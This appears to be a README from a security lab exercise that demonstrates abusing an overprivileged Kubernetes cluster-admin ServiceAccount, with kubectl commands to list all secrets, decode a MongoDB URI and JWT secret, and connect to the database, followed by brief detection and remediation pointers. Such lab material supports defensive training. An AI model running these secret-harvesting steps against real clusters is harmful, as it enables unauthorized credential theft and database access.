# Kubernetes Exploitation Demo

Step-by-step demonstration of exploiting overprivileged Kubernetes RBAC.

## Overview

This demo shows how an attacker can abuse the `cluster-admin` ServiceAccount binding.

## Quick Demos

```bash
make demo-k8s
make demo-secrets
```

## Manual Steps

### 1. Configure kubectl

```bash
aws eks update-kubeconfig --name wiz-exercise-eks --region us-east-1
```

### 2. Verify Permissions

```bash
# Check ServiceAccount permissions
kubectl auth can-i --list --as=system:serviceaccount:tasky:tasky-sa
```

Output shows `*.*` with all verbs - full cluster access!

### 3. Access Secrets

```bash
# List all secrets
kubectl get secrets --all-namespaces

# Get tasky secrets
kubectl get secret mongodb-credentials -n tasky -o yaml
```

### 4. Decode Credentials

```bash
# MongoDB URI
kubectl get secret mongodb-credentials -n tasky \
  -o jsonpath='{.data.MONGODB_URI}' | base64 -d
echo ""

# JWT Secret
kubectl get secret mongodb-credentials -n tasky \
  -o jsonpath='{.data.SECRET_KEY}' | base64 -d
echo ""
```

### 5. Use Credentials

```bash
# Connect to MongoDB
mongosh "mongodb://tasky:password@10.0.1.50:27017/tasky"
```

## Detection

- GuardDuty EKS findings
- Kubernetes audit logs

## Remediation

Apply least privilege RBAC. See [WIZ-004](../security/k8s-cluster-admin.md).
